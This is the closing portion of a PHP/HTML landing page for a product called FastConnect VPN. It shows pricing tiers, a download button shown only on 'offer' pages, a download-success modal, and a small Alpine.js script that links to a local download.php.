                        <h3 class="text-2xl font-bold text-gray-900 mb-2">Pro</h3>
                        <p class="text-gray-600 mb-6">Best for families and teams</p>
                        <div class="mb-6">
                            <span class="text-4xl font-bold text-emerald-600">$19.99</span>
                            <span class="text-gray-600">/month</span>
                        </div>
                        <?php if ($is_offer_page): ?>
                        <button @click="downloadApp()" class="w-full flex items-center justify-center gap-2 bg-emerald-600 hover:bg-emerald-700 text-white py-3 px-6 rounded-lg font-medium transition-all duration-300 mb-6 shadow-lg shadow-emerald-600/30">
                            <i data-lucide="download" class="h-4 w-4"></i>
                            Download Now
                        </button>
                        <?php else: ?>
                        <button disabled class="w-full flex items-center justify-center gap-2 bg-gray-400 text-white py-3 px-6 rounded-lg font-medium transition-all duration-300 mb-6 cursor-not-allowed opacity-75">
                            <i data-lucide="clock" class="h-4 w-4"></i>
                            Coming Soon
                        </button>
                        <?php endif; ?>
                    </div>
                    <ul class="space-y-3 text-gray-600 text-sm">
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            5 Device Connections
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            Dynamic Location Switching
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            Military-Grade Encryption
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            Smart App Profiling
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            24/7 Priority Support
                        </li>
                    </ul>
                </div>

                <!-- Enterprise Plan -->
                <div class="border-2 border-gray-200 rounded-2xl p-6 hover:border-emerald-200 transition-all duration-300 hover:scale-105 hover:shadow-lg">
                    <div class="text-center">
                        <h3 class="text-2xl font-bold text-gray-900 mb-2">Enterprise</h3>
                        <p class="text-gray-600 mb-6">For businesses and power users</p>
                        <div class="mb-6">
                            <span class="text-4xl font-bold text-gray-900">$49.99</span>
                            <span class="text-gray-600">/month</span>
                        </div>
                        <button disabled class="w-full flex items-center justify-center gap-2 bg-gray-400 text-white py-3 px-6 rounded-lg font-medium transition-all duration-300 mb-6 cursor-not-allowed opacity-75">
                            <i data-lucide="clock" class="h-4 w-4"></i>
                            Coming Soon
                        </button>
                    </div>
                    <ul class="space-y-3 text-gray-600 text-sm">
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            Unlimited Devices
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            Advanced Location Control
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            Zero Trust Security
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            Custom Integrations
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            Dedicated Account Manager
                        </li>
                    </ul>
                </div>
            </div>

            <!-- Money Back Guarantee -->
            <div class="text-center mt-12">
                <div class="inline-flex items-center bg-emerald-100 text-emerald-800 px-6 py-3 rounded-full">
                    <i data-lucide="shield-check" class="h-5 w-5 mr-2"></i>
                    30-day money-back guarantee on all plans
                </div>
            </div>
        </div>
    </section>

    <!-- Success Modal -->
    <div x-show="showSuccessModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50" @click.self="closeSuccessModal()">
        <div class="bg-white rounded-lg max-w-md w-full">
            <div class="p-6 text-center">
                <!-- Success Icon -->
                <div class="mx-auto flex items-center justify-center h-16 w-16 rounded-full bg-green-100 mb-4">
                    <svg class="h-8 w-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                    </svg>
                </div>
                
                <!-- Success Title -->
                <h3 class="text-lg font-semibold text-gray-900 mb-2">Download Started!</h3>
                
                <!-- Success Message -->
                <p class="text-gray-600 mb-6">
                    FastConnect VPN download has started successfully. This VPN will help you protect your privacy and secure your internet connection with ease.
                </p>
                
                <!-- Features List -->
                <div class="text-left bg-gray-50 rounded-lg p-4 mb-6">
                    <h4 class="font-medium text-gray-900 mb-2">What you can do with FastConnect VPN:</h4>
                    <ul class="text-sm text-gray-600 space-y-1">
                        <li>• Dynamic location switching for privacy</li>
                        <li>• Granular control over your digital footprint</li>
                        <li>• Smart app profiling and configurations</li>
                        <li>• AI-powered anomaly detection</li>
                    </ul>
                </div>
                
                <!-- Close Button -->
                <button 
                    @click="closeSuccessModal()"
                    class="w-full bg-emerald-600 text-white px-6 py-3 rounded-lg hover:bg-emerald-700 transition-colors font-medium"
                >
                    Got it!
                </button>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-gray-900 text-white py-12 px-4">
        <div class="container mx-auto text-center">
            <div class="flex items-center justify-center space-x-2 mb-4">
                <i data-lucide="shield" class="h-6 w-6 text-emerald-400"></i>
                <span class="text-xl font-bold">FastConnect VPN</span>
            </div>
            <p class="text-gray-400 mb-6">Revolutionary VPN technology for the privacy-conscious user.</p>
            <div class="border-t border-gray-800 pt-6">
                <p class="text-gray-400">&copy; 2025 FastConnect VPN. All rights reserved.</p>
            </div>
        </div>
    </footer>

    <script>
        // Alpine.js component
        function app() {
            return {
                // Success modal state
                showSuccessModal: false,

                init() {
                    this.$nextTick(() => {
                        lucide.createIcons();
                    });
                },

                // Smooth scroll function
                smoothScroll(targetId) {
                    const element = document.getElementById(targetId);
                    if (element) {
                        element.scrollIntoView({
                            behavior: 'smooth',
                            block: 'start'
                        });
                    }
                },

                // Download app function - only works for offer pages
                downloadApp() {
                    const link = document.createElement('a');
                    link.href = '/download.php';
                    link.download = true;
                    link.click();
                    this.showSuccessModal = true;
                },

                // Close success modal function
                closeSuccessModal() {
                    this.showSuccessModal = false;
                }
            }
        }

        // Initialize Lucide icons on page load as fallback
        document.addEventListener('DOMContentLoaded', function() {
            lucide.createIcons();
        });
    </script>
</body>
</html>
